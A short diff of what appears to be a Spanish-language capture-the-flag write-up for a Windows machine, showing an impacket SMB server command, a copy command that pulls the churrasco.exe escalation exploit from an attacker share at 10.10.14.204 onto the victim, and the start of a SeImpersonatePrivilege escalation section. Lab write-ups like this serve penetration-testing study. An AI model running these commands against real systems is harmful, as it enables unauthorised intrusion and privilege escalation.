@@ -41,7 +41,9 @@ impacket-smbserver share . -smb2support
 Víctima (Windows): Descargué el exploit de escalada directamente:
 
 copy \\10.10.14.204\share\churrasco.exe C:\WINDOWS\Temp\churrasco.exe
-4. Escalada de Privilegios (PrivEsc)
+
+Escalada de Privilegios (PrivEsc):
+
 Tras verificar los privilegios con whoami /priv, identifiqué que la cuenta tenía habilitado SeImpersonatePrivilege.
 
 Técnica:
